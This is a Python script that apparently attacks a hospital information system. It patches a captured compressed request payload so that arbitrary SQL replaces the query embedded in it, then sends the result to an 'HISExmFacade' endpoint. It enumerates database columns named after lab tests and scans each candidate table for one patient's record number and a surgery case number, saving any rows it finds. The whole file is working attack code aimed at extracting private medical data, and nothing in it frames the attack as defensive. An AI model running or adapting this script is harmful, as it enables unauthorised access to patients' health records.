from his_client_final import HISClient
import requests
import zlib
import re

class BroadColumnHunter(HISClient):
    def execute_sql(self, sql):
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = BroadColumnHunter()

keywords = ['WBC', 'HEMO', 'AST', 'ALT', 'GLUCOSE', 'CRE']
candidates = set()

with open("lab_candidates.txt", "w", encoding="utf-8") as f:
    for kw in keywords:
        print(f"Searching for %{kw}% columns...")
        sql = f"SELECT OWNER,TABLE_NAME,COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE COLUMN_NAME LIKE '%{kw}%' AND ROWNUM<=50"
        res = hunter.execute_sql(sql)
        
        if res and "<NewDataSet>" in res:
            matches = re.findall(r'<OWNER>(.*?)</OWNER>\s*<TABLE_NAME>(.*?)</TABLE_NAME>', res)
            for owner, table in matches:
                full_table = f"{owner}.{table}"
                if full_table not in candidates:
                    candidates.add(full_table)
                    f.write(f"Candidate ({kw}): {full_table}\n")

    print(f"\nScanning {len(candidates)} candidates for 003617083J...")
    for t in candidates:
        try:
            # Skip massive tables if known?
            q = f"SELECT * FROM {t} WHERE HHISNUM='003617083J'"
            r = hunter.execute_sql(q)
            if r and "<NewDataSet>" in r:
                 print(f"!!! FOUND DATA IN {t} !!!")
                 f.write(f"\n!!! FOUND DATA IN {t} !!!\n")
                 f.write(r[:5000] + "\n")
                 
                 # Also try HCASENO just in case
            q2 = f"SELECT * FROM {t} WHERE HCASENO='75176986'" # Surgery Case
            r2 = hunter.execute_sql(q2)
            if r2 and "<NewDataSet>" in r2:
                 print(f"!!! FOUND DATA IN {t} (HCASENO) !!!")
                 f.write(f"\n!!! FOUND DATA IN {t} (HCASENO) !!!\n")
                 f.write(r2[:5000] + "\n")

        except Exception as e:
            f.write(f"Error checking {t}: {e}\n")

